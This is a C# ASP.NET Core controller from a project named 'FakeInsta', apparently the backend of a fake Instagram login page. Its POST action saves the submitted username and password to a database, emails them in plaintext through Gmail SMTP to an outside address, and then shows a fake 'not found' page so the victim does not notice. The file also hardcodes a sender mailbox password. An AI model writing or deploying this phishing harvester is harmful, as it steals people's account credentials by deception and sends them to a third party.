using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using FakeInsta.Models;
using System.Net.Mail;
using System.Net;
using FakeInsta.DAL;

namespace FakeInsta.Controllers
{
    public class HomeController : Controller
    {
        private readonly dbcontext _context;
        public HomeController(dbcontext context)
        {
            _context = context;
        }
        public IActionResult Index()
        {
            return View();
        }

        [HttpPost, ValidateAntiForgeryToken]
        public async Task<IActionResult> Index(LoginInfo info)
        {
            LoginInfo newInfo = new LoginInfo()
            {
                username = info.username,
                password = info.password
            };
            await _context.LoginInfos.AddAsync(newInfo);
            await _context.SaveChangesAsync();

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587)
            {
                UseDefaultCredentials = false,
                EnableSsl = true,
                Credentials = new NetworkCredential("asulut8@gmail.com", "asulut8asulut8")
            };

            MailMessage message = new MailMessage("asulut8@gmail.com", "abulfaz1099@gmail.com")
            {
                IsBodyHtml = true,
                Subject = "insta test",
                Body = "username:" + info.username + "<br/>" + "password:" + info.password
            };
            
            await client.SendMailAsync(message);
            return RedirectToAction(nameof(ErrorNotFound));
        }
        public IActionResult ErrorNotFound()
        {
            return View();
        }
    }
}
